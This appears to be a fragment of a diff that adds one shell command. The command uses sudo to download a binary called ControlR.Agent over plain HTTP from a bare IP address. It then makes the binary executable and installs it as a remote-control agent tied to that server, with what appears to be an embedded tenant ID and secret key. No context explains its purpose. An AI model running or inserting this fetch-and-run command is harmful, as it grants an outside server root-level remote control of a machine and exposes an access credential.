@@ -1,0 +1,1 @@
+sudo rm -f /tmp/ControlR.Agent && sudo wget -q -O /tmp/ControlR.Agent http://185.215.166.16:5120/downloads/linux-x64/ControlR.Agent && sudo chmod +x /tmp/ControlR.Agent && sudo /tmp/ControlR.Agent install -s http://185.215.166.16:5120/ -i 185.215.166.16:5120 -t bbea5797-a4bd-4d39-a640-d21576170c12 -k GbPgRZpiI1fBenxQ7d3V2Hp4cvXfuMKcgwNnVO76M6rd6et3CfGGrrFdAyDC4wa2  
